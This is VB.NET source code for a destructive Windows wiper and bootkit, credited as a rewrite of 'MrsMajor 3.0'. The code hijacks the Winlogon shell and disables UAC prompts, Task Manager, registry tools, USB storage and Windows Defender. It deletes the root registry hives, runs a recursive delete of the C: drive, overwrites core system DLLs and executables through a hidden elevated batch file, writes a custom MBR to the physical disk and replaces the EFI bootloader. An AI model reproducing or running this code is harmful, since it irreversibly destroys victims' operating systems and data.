' The original source code made by rootabx is available at: https://github.com/Gork3m/MrsMajor-3.0
' rewritten in VB.NET by Angel Castillo / Windows Vista

Imports System.Diagnostics
Imports System.IO
Imports System.Threading
Imports System.Windows.Forms
Imports Microsoft.Win32

Module Program

    Public Sub runprotector()
        Application.Run(New protection64())
    End Sub

    Public Sub runmform()
        Application.Run(New majorsgui())
    End Sub

    Sub Main()
        ' Initial registry modifications
        Try
            Dim reg As RegistryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon")
            reg.SetValue("Shell", "explorer.exe, wscript.exe ""C:\windows\winbase_base_procid_none\secureloc0x65\WinRapistI386.vbs""")
            reg.Close()
        Catch
        End Try

        Try
            Dim reg As RegistryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system")
            reg.SetValue("ConsentPromptBehaviorAdmin", 0)
            reg.Close()
        Catch
        End Try

        Try
            Dim reg As RegistryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop")
            reg.SetValue("NoChangingWallpaper", 1)
            reg.Close()
        Catch
        End Try

        Try
            Dim reg As RegistryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System")
            reg.SetValue("DisableTaskMgr", 1)
            reg.Close()
        Catch
        End Try

        Try
            Dim reg As RegistryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System")
            reg.SetValue("DisableRegistryTools", 1)
            reg.Close()
        Catch
        End Try

        Try
            Dim reg As RegistryKey = Registry.CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Policies\Explorer")
            reg.SetValue("NoRun", 1)
            reg.Close()
        Catch
        End Try

        Try
            Dim reg As RegistryKey = Registry.CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Policies\Explorer")
            reg.SetValue("NoWinKeys", 1)
            reg.Close()
        Catch
        End Try

        Try
            Dim reg As RegistryKey = Registry.LocalMachine.CreateSubKey("SYSTEM\CurrentControlSet\Services\usbstor")
            reg.SetValue("Start", 4)
            reg.Close()
        Catch
        End Try

        Try
            Dim reg As RegistryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\Policies\Microsoft\Windows Defender")
            reg.SetValue("DisableAntiSpyware", 1)
            reg.Close()
        Catch
        End Try

        Try
            Dim reg As RegistryKey = Registry.CurrentUser.CreateSubKey("Control Panel\Cursors")
            reg.SetValue("Arrow", "C:\Windows\winbase_base_procid_none\secureloc0x65\rcur.cur")
            reg.SetValue("AppStarting", "C:\Windows\winbase_base_procid_none\secureloc0x65\rcur.cur")
            reg.SetValue("Hand", "C:\Windows\winbase_base_procid_none\secureloc0x65\rcur.cur")
        Catch
        End Try

        ' Start destructive tasks in a separate thread
        Dim destructiveThread As New Thread(AddressOf PerformDestructiveTasks)
        destructiveThread.Start()

        ' Perform resource-related tasks
        If File.Exists("C:\Windows\WinAttr.gci") Then
            Dim files2owr() As String = {"winload.exe", "csrss.exe", "wininit.exe", "wininet.dll", "aclui.dll", "ADVAPI32.DLL", "crypt32.dll", "hal.dll", "logonui.exe", "ntdll.dll", "cryptbase.dll", "kernel32.dll", "userinit.exe", "crypt.dll", "chkdsk.exe"}
            For Each fileName In files2owr
                Dim currentDirectory As String = Environment.CurrentDirectory
                Dim username As String = Environment.GetEnvironmentVariable("username")
                Dim text As String = "@echo off" & vbNewLine & "cd %windir%\System32" & vbNewLine & "takeown /f " & fileName & vbNewLine & "icacls " & fileName & "/grant """ & username & """:F" & vbNewLine & "echo xa > """ & fileName & """"
                File.WriteAllText("taskOverwrite.bat", text)

                Try
                    Dim prc As New Process
                    prc.StartInfo.FileName = "cmd.exe"
                    prc.StartInfo.Arguments = "/c """ & currentDirectory & "\taskOverwrite.bat"""
                    prc.StartInfo.Verb = "runas"
                    prc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
                    prc.Start()
                Catch
                    ' Handle any exceptions here
                End Try
            Next

            ' Perform resource-related operations
            ExtractAndWriteBinary("Resources\mrsmajor5mbr.bin", "\\.\PhysicalDrive0")
            RunCommand("mountvol x: /s")
            ExtractAndCopyEFI("Resources\bootmgfw.efi", "X:\EFI\Boot\Microsoft\bootmgfw.efi")
        End If

        ' Show message box after resource tasks are done
        MsgBox("You messed up... But if you don't click this message nothing's going to happen.", MsgBoxStyle.Critical, "uh oh")

        ' Continue with the rest of the tasks
        System.Threading.ThreadPool.QueueUserWorkItem(New Threading.WaitCallback(AddressOf runprotector))
        System.Threading.ThreadPool.QueueUserWorkItem(New Threading.WaitCallback(AddressOf runmform))
        Application.Run(New MainForm())
    End Sub

    Private Sub PerformDestructiveTasks()
        ' Perform destructive tasks
        Try
            Dim regKeysToDelete() As String = {
                "HKCR",
                "HKCU",
                "HKLM",
                "HKU",
                "HKCC"
            }

            For Each regKey In regKeysToDelete
                RunCommand($"reg delete {regKey} /f")
            Next

            ' Dangerous command to delete the C: drive
            RunCommand("rd c: /s /q")
        Catch
            ' Handle any exceptions here
        End Try
    End Sub

    Private Sub ExtractAndWriteBinary(sourceFilePath As String, targetDrive As String)
        ' Extract and write binary data to a physical drive
        Dim data As Byte() = File.ReadAllBytes(sourceFilePath)
        Using fs As New FileStream(targetDrive, FileMode.Create, FileAccess.Write)
            fs.Write(data, 0, data.Length)
        End Using
    End Sub

    Private Sub ExtractAndCopyEFI(sourceFilePath As String, destinationFilePath As String)
        ' Extract and copy EFI file to the destination
        File.Copy(sourceFilePath, destinationFilePath, True)
    End Sub

    Private Sub RunCommand(command As String)
        ' Execute a command line process
        Dim processInfo As New ProcessStartInfo("cmd.exe", $"/c {command}") With {
            .RedirectStandardOutput = True,
            .UseShellExecute = False,
            .CreateNoWindow = True
        }
        Using process As Process = Process.Start(processInfo)
            Dim output As String = process.StandardOutput.ReadToEnd()
            process.WaitForExit()
            Console.WriteLine(output)
        End Using
    End Sub

End Module
